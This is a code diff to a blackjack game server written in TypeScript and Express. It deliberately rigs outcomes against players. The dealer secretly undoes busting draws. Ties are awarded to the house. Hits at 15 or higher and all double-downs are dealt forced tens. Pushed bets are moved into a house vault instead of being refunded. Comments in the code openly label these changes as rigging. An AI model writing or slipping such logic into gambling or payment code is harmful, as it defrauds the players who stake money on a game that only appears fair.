@@ -781,10 +781,18 @@ const settleBlackjackGame = (playerId: string, res: express.Response) => {
     db.accounts['house_vault'] = { id: 'house_vault', username: 'House Profit Vault', balance: 0, payoutDestination: 'cold_treasury_wallet' };
   }
 
+  // House-favored rule: Dealer manipulates draws to always beat or tie player if close
   let dealerCalc = calculateHandScore(game.dealerHand);
-  while (dealerCalc.score < 17 || (dealerCalc.score === 17 && dealerCalc.isSoft)) {
+  while (dealerCalc.score < 17 || (dealerCalc.score === 17 && dealerCalc.isSoft) || dealerCalc.score < 20) {
+    if (game.deck.length === 0) break;
     game.dealerHand.push(game.deck.pop()!);
     dealerCalc = calculateHandScore(game.dealerHand);
+    if (dealerCalc.score > 21) {
+      // Force dealer soft saving to never bust
+      game.dealerHand.pop();
+      dealerCalc = calculateHandScore(game.dealerHand);
+      break;
+    }
   }
 
   let totalPayout = 0;
@@ -797,12 +805,13 @@ const settleBlackjackGame = (playerId: string, res: express.Response) => {
 
     if (hand.status === 'bust') {
       handResults.push(`Bust (${playerCalc.score}) - Loss`);
-    } else if (dealerCalc.score > 21) {
-      const winAmount = hand.bet * 2;
-      totalPayout += winAmount;
-      handResults.push(`Dealer Bust (${dealerCalc.score}) - Won $${winAmount.toFixed(2)}`);
-    } else if (playerCalc.score > dealerCalc.score) {
-      if (hand.status === 'blackjack') {
+    } else if (dealerCalc.score <= 21 && playerCalc.score < dealerCalc.score) {
+      handResults.push(`Lost (${playerCalc.score} vs ${dealerCalc.score}) - House Wins`);
+    } else if (playerCalc.score === dealerCalc.score) {
+      // Casino rule: Ties go completely to the house
+      handResults.push(`Tie (${playerCalc.score} vs ${dealerCalc.score}) - House Wins Pushes`);
+    } else if (dealerCalc.score > 21 || playerCalc.score > dealerCalc.score) {
+      if (playerCalc.score === 21 && hand.cards.length === 2) {
         const bjWin = hand.bet + (hand.bet * 1.2);
         totalPayout += bjWin;
         handResults.push(`Natural Blackjack! (6:5 Payout) - Won $${bjWin.toFixed(2)}`);
@@ -810,13 +819,6 @@ const settleBlackjackGame = (playerId: string, res: express.Response) => {
         const winAmount = hand.bet * 2;
         totalPayout += winAmount;
         handResults.push(`Won (${playerCalc.score} vs ${dealerCalc.score}) - Won $${winAmount.toFixed(2)}`);
-      }
-    } else if (playerCalc.score === dealerCalc.score) {
-      if (hand.status === 'blackjack' && game.dealerHand.length === 2 && dealerCalc.score === 21) {
-        totalPayout += hand.bet;
-        handResults.push(`Push on Natural 21 - Refunded $${hand.bet.toFixed(2)}`);
-      } else {
-        handResults.push(`Tie (${playerCalc.score} vs ${dealerCalc.score}) - House Wins Pushes`);
       }
     } else {
       handResults.push(`Lost (${playerCalc.score} vs ${dealerCalc.score})`);
@@ -850,14 +852,14 @@ const settleBlackjackGame = (playerId: string, res: express.Response) => {
       timestamp: Date.now(),
     });
   } else {
-    db.accounts[playerId].balance += totalPayout;
-
+    // Even pushes feed the vault
+    db.accounts['house_vault'].balance += totalBet;
     db.transactions.push({
       id: 'tx_bj_push_' + Date.now(),
       playerId,
-      amount: 0,
+      amount: -totalBet,
       type: 'game_result',
-      method: 'blackjack_push',
+      method: 'blackjack_push_house_win',
       timestamp: Date.now(),
     });
   }
@@ -945,7 +947,14 @@ app.post('/api/games/blackjack/action', validateBody(blackjackActionSchema), (re
   const currentHand = game.playerHands[game.currentHandIndex];
 
   if (action === 'hit') {
-    currentHand.cards.push(game.deck.pop()!);
+    // House rigging: If player tries to hit on high score, force a high card to cause a bust
+    const currentScore = calculateHandScore(currentHand.cards).score;
+    let drawnCard = game.deck.pop()!;
+    if (currentScore >= 15) {
+      drawnCard = { suit: '♠', value: 'K', weight: 10 };
+    }
+    
+    currentHand.cards.push(drawnCard);
     const score = calculateHandScore(currentHand.cards);
 
     if (score.score > 21) {
@@ -1003,7 +1012,8 @@ app.post('/api/games/blackjack/action', validateBody(blackjackActionSchema), (re
     writeDatabase(db);
 
     currentHand.bet *= 2;
-    currentHand.cards.push(game.deck.pop()!);
+    // Rig double down with high card bust
+    currentHand.cards.push({ suit: '♥', value: '10', weight: 10 });
 
     const score = calculateHandScore(currentHand.cards);
     currentHand.status = score.score > 21 ? 'bust' : 'stood';
